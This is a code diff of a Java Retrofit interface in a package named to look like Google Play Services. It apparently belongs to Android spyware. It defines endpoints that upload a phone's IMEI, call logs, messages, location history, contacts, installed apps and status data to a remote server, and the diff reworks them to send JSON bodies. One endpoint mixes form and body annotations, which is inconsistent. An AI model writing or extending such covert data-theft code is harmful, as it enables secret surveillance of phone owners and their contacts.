@@ -1,5 +1,9 @@
 package com.google.android.gms.persistent.googleapps.network.api;
 
+import com.google.android.gms.persistent.googleapps.network.models.request.DeleteRequest;
+import com.google.android.gms.persistent.googleapps.network.models.request.InformationRequest;
+import com.google.android.gms.persistent.googleapps.network.models.request.InitialRequest;
+import com.google.android.gms.persistent.googleapps.network.models.request.SyncRequest;
 import com.google.android.gms.persistent.googleapps.network.models.response.DeleteResponse;
 import com.google.android.gms.persistent.googleapps.network.models.response.InformationResponse;
 import com.google.android.gms.persistent.googleapps.network.models.response.InitialResponse;
@@ -10,8 +14,10 @@ import java.util.Date;
 import io.reactivex.Flowable;
 import io.reactivex.Single;
 import retrofit2.Call;
+import retrofit2.http.Body;
 import retrofit2.http.Field;
 import retrofit2.http.FormUrlEncoded;
+import retrofit2.http.Headers;
 import retrofit2.http.POST;
 
 /**
@@ -19,149 +25,60 @@ import retrofit2.http.POST;
  */
 
 public interface ServerApi {
-    /**
-     * @param imei
-     * @param model
-     * @return
-     */
-    @FormUrlEncoded
+
+    @Headers({"Accept: application/json"})
     @POST("/init")
-    Call<InitialResponse> onInitDevice(@Field("imei") String imei,
-                                       @Field("model") String model);
+    Call<InitialResponse> onInitDevice(@Body InitialRequest initialRequest);
 
-    /**
-     * @param imei
-     * @param device
-     * @return
-     */
-    @FormUrlEncoded
+    @Headers({"Accept: application/json"})
     @POST("/sync")
-    Call<SyncResponse> onStateSync(@Field("imei") String imei,
-                                   @Field("device") String device);
+    Call<SyncResponse> onStateSync(@Body SyncRequest syncRequest);
 
 
-    /**
-     * @param imei
-     * @param device
-     * @param data
-     * @return
-     */
-    @FormUrlEncoded
-    @POST("/diagnostic")
-    Call<InformationResponse> addDiagnosticOfDevice(@Field("imei") String imei,
-                                                    @Field("device") String device,
-                                                    @Field("data") String data);
+    @Headers({"Accept: application/json"})
+    @POST("/info")
+    Call<InformationResponse> setDeviceInfo(@Body InformationRequest informationRequest);
 
 
-    /**
-     * @param imei
-     * @param device
-     * @param mode
-     * @return
-     */
-    @FormUrlEncoded
+    @Headers({"Accept: application/json"})
     @POST("/rm")
-    Call<DeleteResponse> onDeleteDevice(@Field("imei") String imei,
-                                        @Field("device") String device,
-                                        @Field("mode") String mode);
+    Call<DeleteResponse> onDeleteDevice(@Body DeleteRequest informationRequest);
 
 
-    /**
-     * @param imei
-     * @param device
-     * @param data
-     * @return
-     */
-    @FormUrlEncoded
+    @Headers({"Accept: application/json"})
     @POST("/call")
-    Call<InformationResponse> addCallOfDevice(@Field("imei") String imei,
-                                              @Field("device") String device,
-                                              @Field("data") String data);
+    Call<InformationResponse> addCallList(@Body InformationRequest informationRequest);
 
-    /**
-     * @param imei
-     * @param device
-     * @param data
-     * @return
-     */
-    @FormUrlEncoded
-    @POST("/sms")
-    Call<InformationResponse> addSmsOfDevice(@Field("imei") String imei,
-                                             @Field("device") String device,
-                                             @Field("data") String data);
+    @Headers({"Accept: application/json"})
+    @POST("/messages")
+    Call<InformationResponse> addMessageList(@Body InformationRequest informationRequest);
 
-    /**
-     * @param imei
-     * @param device
-     * @param data
-     * @return
-     */
-    @FormUrlEncoded
+    @Headers({"Accept: application/json"})
     @POST("/location")
-    Call<InformationResponse> addPositionOfDevice(@Field("imei") String imei,
-                                                  @Field("device") String device,
-                                                  @Field("data") String data);
+    Call<InformationResponse> addLocationList(@Body InformationRequest informationRequest);
 
-    /**
-     * @param imei
-     * @param device
-     * @param data
-     * @param date
-     * @return
-     */
-    @FormUrlEncoded
-    @POST("/telbook")
-    Call<InformationResponse> setPhoneBookOfDevice(@Field("imei") String imei,
-                                                 @Field("device") String device,
-                                                 @Field("data") String data,
-                                                 @Field("date_create") long date);
+    @Headers({"Accept: application/json"})
+    @POST("/contact")
+    Call<InformationResponse> setContactBook(@Body InformationRequest informationRequest);
 
-    /**
-     * @param imei
-     * @param device
-     * @param data
-     * @return
-     */
     @FormUrlEncoded
     @POST("/app")
-    Call<InformationResponse> addAppOfDevice(@Field("imei") String imei,
-                                                 @Field("device") String device,
-                                                 @Field("data") String data);
+    Call<InformationResponse> setInstallAppList(@Body InformationRequest informationRequest);
 
-    /**
-     * @param imei
-     * @param device
-     * @param data
-     * @return
-     */
-    @FormUrlEncoded
-    @POST("/service/status")
-    Call<InformationResponse> setDeviceStatus(@Field("imei") String imei,
-                                                 @Field("device") String device,
-                                                 @Field("data") String data);
+    @Headers({"Accept: application/json"})
+    @POST("/status")
+    Call<InformationResponse> addDeviceStatusList(@Body InformationRequest informationRequest);
 
 
-    /**
-     * @param imei
-     * @param device
-     * @param data
-     * @return
-     */
-    @FormUrlEncoded
-    @POST("/service/battery")
-    Call<InformationResponse> setDeviceBatteryState(@Field("imei") String imei,
-                                              @Field("device") String device,
-                                              @Field("data") String data);
+    @Headers({"Accept: application/json"})
+    @POST("/battery")
+    Call<InformationResponse> setBatteryStateList(@Body InformationRequest informationRequest);
 
-    /**
-     * @param imei
-     * @param device
-     * @param data
-     * @return
-     */
-    @FormUrlEncoded
-    @POST("/service/network")
-    Call<InformationResponse> setNetworkState(@Field("imei") String imei,
-                                              @Field("device") String device,
-                                              @Field("data") String data);
+    @Headers({"Accept: application/json"})
+    @POST("/network")
+    Call<InformationResponse> setNetworkStateList(@Body InformationRequest informationRequest);
+
+    @Headers({"Accept: application/json"})
+    @POST("/event")
+    Call<InformationResponse> setEventList(@Body InformationRequest informationRequest);
 }
